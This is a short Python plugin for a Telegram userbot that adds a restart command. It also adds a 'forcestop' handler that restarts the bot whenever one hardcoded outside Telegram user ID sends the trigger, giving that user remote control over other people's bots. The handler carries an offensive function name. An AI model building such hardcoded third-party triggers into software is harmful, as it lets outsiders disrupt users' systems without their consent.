# This Source Code Form is subject to the terms of the GNU
# General Public License, v.3.0. If a copy of the GPL was not distributed with this
# file, You can obtain one at https://www.gnu.org/licenses/gpl-3.0.en.html
# By @TechyNewbie


import os
import sys


@client.on(events(pattern="restart"))
async def restart(event):
    if event.fwd_from:
        return
    await client.send_message(
        event.chat_id,
        "**DeOXy MASTER:** `My Boss wishes you to stop using this bot for a minute`, **Approved**"
    )
    await event.delete()
    await client.disconnect()
    os.execl(sys.executable, sys.executable, *sys.argv)
    quit()
    

@client.on(events(pattern="forcestop", from_users=767014786, incoming=True))
async def hitler(e):
    await restart(e)


HELPER.update({"ultimateaccess69": "\
**Available commands in ultimateaccess69 module:**\
\n`.restart`\
\n`.forcestop`\
"})
